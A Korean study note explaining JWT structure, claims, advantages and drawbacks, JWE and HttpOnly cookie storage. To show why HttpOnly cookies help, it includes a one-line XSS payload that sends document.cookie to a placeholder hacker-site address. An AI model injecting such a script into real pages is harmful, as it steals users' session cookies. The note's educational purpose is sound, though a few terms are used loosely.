# JWT(JSON Web Token)

## JWT? JSON 포맷을 이용하여 Self-Contained 방식으로 사용자에 대한 정보를 저장하는 Claim 기반 Web Token

> 유저가 전송하는 데이터를 숨기는 것이 아닌, 유저가 전송하는 데이터를 “인증” 하는데 초점
> 
- 주요 특징 : 토큰 자체에 사용자의 권한 정보나 서비스를 사용하기 위한 정보가 포함(self-contained) → 토큰이 한 번 발급된 이후 사용자의 정보를 바꾸더라도 토큰을 재발급 받지 않은 이상 반영되지 않음 (refresh Token)
- 저장 위치
    - JWT : client 저장
    - Session : server 저장 → memory & storage 통해 세션을 관리했던 서버의 부담&보안 이슈

## JWT의 구조 (Header, Payload, Signature)

![TokenStructure](https://user-images.githubusercontent.com/85625910/207079216-0b6b601a-0d89-44a3-8895-938045afc4a4.png)

- Header : JWT 에서 사용할 타입과 Hash 알고리즘의 종류가 담겨 있음
    - 알고리즘 종류 : HMAC, SHA256, RSA, HS256 or RS256
    - JSON 객체를 문자열로 직렬화 하고 UTF-8 과 Base64 URL-Safe 인코딩
        
        ```java
        Base64URLSafe(UTF-8('{"alg": "ES256","kid": "Key ID"}')) -> eyJhbGciOiJFUzI1NiIsImtpZCI6IktleSBJRCJ9
        ```
        
- Payload : server 에서 첨부한 사용자 권한 정보와 데이터가 담겨 있음
    - Claim? Payload에 담은 정보의 한 조각을 의미 (아래는 대표적으로 사용되는 claim)
        - Issuer(iss)
        - Subject(sub)
        - Audience(aud)
        - Expiration time(exp)
        - Issued at (iat)
    - 이 외에도 Custom claim 사용 가능 (단, 큰 용량 및 중요 데이터는 지양 → JWT는 쉽게 decode 되기 때문)
    - name&value 의 한 쌍으로 이루어짐
- Signature(핵심 part) : Header, Payload 를 Base64 URL-safe Encode 를 한 이후 Header에 명시된 hash 함수를 적용하고, Primary Key로 서명한 전자서명이 담겨 있음

> [https://meetup.toast.com/posts/239](https://meetup.toast.com/posts/239) → JWT JAVA 구현 Code 참고
> 

## JWT의 장/단점

- 장점
    - 확장성 : 다른 도메인이나 어플리케이션간 이동이 발생해도 같은 JWT 사용 ( 기존 server에 세션을 저장하는 방식은 분산화된 환경에서 처음 로그인한 server 에만 요청을 보내도록 설정하는 등의 작업 필요 → Token 값만 알고 있으면 어떤 서버로 요청을 보내던 가능)
    - Cookie 사용으로 인한 보안 취약점 개선
    - 불필요한 인증 과정 감소 : JWT를 사용하면 사용자와 관련된 정보를 Auth server 에 매번 요청할 필요 없음
    - HTTPS 사용의 강제성 : Authorization Header 에 JWT 를 담아 보내기 위해서는 HTTPS를 사용해야 함
- 단점
    - Token이 만료되기 전에 노출되면 보안적으로 매우 취약
    - claim이 많아 질수록 JWT의 Token 이 길어짐 → 네트워크 대역폭 낭비가 심해짐
    - Payload 에 대한 정보는 암호화 되지 않고 Base64 encoding만 하기 때문에 보안에 취약
        - Solution : JWE(JSON Web Encryption)을 통해 암호화 하거나 중요 데이터를 payload에 담지 않는다
        - JWE(JSON Web Encryption)
            - **Authenticated Encryption with Associated Data (AEAD)** 알고리즘을 사용하여 Integrity(무결성) 보장
            - 대칭키 이용 : 내용 암호화 → CEK(Content Encryption Key)
            - 비대칭키 이용 : CEK를 암호화
            - 이 방식은 client 에게 대칭키를 숨길 수 없음 → 신뢰할 수 없는 client 와 연동하는 경우 추천되지 않음
            
            > [https://www.scottbrady91.com/jose/json-web-encryption](https://www.scottbrady91.com/jose/json-web-encryption)
            > 
        - JWS(Signature) + JSE(Encryption) = 보안성(무결성+기밀성)
            - 즉, 둘이 상호 보완하여 안전한 claim 전송 가능
            
            > [https://syntaxsugar.tistory.com/entry/JOSEJSON-Object-Signing-and-Encryption](https://syntaxsugar.tistory.com/entry/JOSEJSON-Object-Signing-and-Encryption)
            > 

## Token 발급과 재발급

![JwtCookie](https://user-images.githubusercontent.com/85625910/207079682-7ff541a7-79c8-4c66-a894-c1bb1fb08b81.png)

- JWT의 취약점 : Token 이 노출된다면 암호화에 의미가 없어짐 → Local Storage에 저장하지 않고 HttpOnly Cookie 를 사용하여 저장 (third party의 자바스크립트 코드를 통해서 쿠키 속의 JWT를 읽어내는 것을 방지)
    - HttpOnly Cookie? 기본 쿠키는 클라이언트에서 자바스크립트로 조회 가능 (해커의 하이재킹 가능) → 즉, browser 에서 해당 쿠키로 접근할 수 없게 되지만 쿠키에 포함된 정보의 대부분이 browser 에서 접근할 필요가 없음
    - 해커의 하이재킹 방식 : XSS(Cross Site Scrpiting) 게시판 또는 이미지 src 에 해커사이트 주소로 연결되게 작성 → 게시물을 공개 게시판에 게시 → 이 게시물을 일반 사용자가 읽게 된다면 자바스크립트 명령이 자동 실행 되어 해커 사이트로 이동되며 모든 cookie 들을 URL 쿼리에 적히게 되며 해커 사이트에 controller 단에서 cookie 라는 파라미터를 받아 탈취
    
    ```java
    <script> location.href = '해커사이트주소?cookie='+document.cookie </script>
    ```
    
    ![HttpOnlyCookie](https://user-images.githubusercontent.com/85625910/207079376-d7333276-dbb6-478f-ae09-4dfcb0ca7d25.png)
    

## 암호화 & 복호화

```java
Sig = ECDSA(SHA256(B64(Header).B64(Payload)), PrivateKey)
JWT = B64(Header).B64(Payload).B64(Sig)
```

- 전자서명에는 비대칭 암호화 알고리즘을 사용하므로 암호화를 위한 키와 복호화를 위한 키는 다르다
    - 암호화(전자서명) : 개인키
    - 복호화(검증) : 공개키